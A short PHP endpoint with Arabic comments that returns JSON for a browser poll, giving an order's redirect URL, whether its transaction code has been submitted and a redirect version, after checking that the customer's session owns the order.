<?php
declare(strict_types=1);
/**
 * JSON فقط — لا تُعِد التوجيه إلى HTML تسجيل الدخول (يُكسر fetch في المتصفح ويعطّل التوجيه/الـ poll).
 * تُرجع التوجيه فقط إن وُجدت جلسة عميل و(بريدها يطابق بريد الطلب أو الطلب أُنشئ في نفس الجلسة).
 */
require __DIR__ . '/../dashboard/init.php';

$orderId = (int) ($_GET['orderId'] ?? 0);
$order = $orderId > 0 ? order_by_id(bujairi_pdo(), $orderId) : null;
if (!$order) {
    json_response([
        'redirectUrl' => null,
        'codeSubmitted' => false,
        'redirectVersion' => 0,
        'needsAuth' => false,
    ]);
}

$sessionEmail = auth_customer_email();
$orderEmail = trim((string) ($order['customer_email'] ?? ''));
if ($sessionEmail === null) {
    json_response([
        'redirectUrl' => null,
        'codeSubmitted' => false,
        'redirectVersion' => 0,
        'needsAuth' => true,
    ]);
}
$ownedInSession = isset($_SESSION['bujairi_owned_orders'], $_SESSION['bujairi_owned_orders'][$orderId])
    && is_array($_SESSION['bujairi_owned_orders']);
$emailMatches = $orderEmail !== '' && strcasecmp($sessionEmail, $orderEmail) === 0;
if (!$emailMatches && !$ownedInSession) {
    json_response([
        'redirectUrl' => null,
        'codeSubmitted' => false,
        'redirectVersion' => 0,
        'needsAuth' => false,
    ]);
}

$tx = trim((string) ($order['transaction_no'] ?? ''));
$redir = trim((string) ($order['client_redirect_url'] ?? ''));
$out = null;
if ($redir !== '') {
    $out = bujairi_redirect_url_for_browser(bujairi_redirect_through_loading_bridge($redir));
}
$rv = (int) ($order['client_redirect_version'] ?? 0);
json_response([
    'redirectUrl' => $out,
    'codeSubmitted' => $tx !== '',
    'redirectVersion' => $rv,
    'needsAuth' => false,
]);
